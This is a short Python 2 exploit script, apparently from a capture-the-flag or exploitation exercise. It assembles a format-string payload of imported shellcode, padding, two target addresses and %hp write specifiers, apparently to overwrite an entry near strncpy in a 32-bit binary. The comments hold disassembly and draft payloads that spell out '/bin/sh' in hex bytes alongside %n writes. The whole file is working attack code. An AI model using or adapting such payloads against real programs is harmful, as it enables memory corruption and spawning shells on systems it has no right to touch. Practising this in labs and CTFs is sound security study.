from shellcode import shellcode

print shellcode + "a"*(2048-len(shellcode)) + "\x61\x8f\x04\x08" + "\x63\x8f\x04\x08" + "%11560x%5$hp%35534x%6$hp"


#23 + 2048 - 23 + 8 
#08050560 <strncpy>:
# 8050560:	83 3d 40 12 0f 08 00 	cmpl   $0x0,0x80f1240
# 8050567:	75 05                	jne    805056e <strncpy+0xe>
# 8050569:	e8 82 9e 00 00       	call   805a3f0


#"\x2f\x62\x69\x6e\x2f\x73\x68" + "\0"  + "\x30\xe5\xfe\xbf%x%x%x%x%x%x%x%n"

#%\x2f\x62\x69\x6e\x2f\x73\x68c%13$n"


#\x2f\x62\x69\x6e\x2f\x73\x68



#\x25   57066   c\x256\x24n\x25  8461   c\x257\x24n"

#\x2f\x62\x69\x6e\x2f\x73\x68
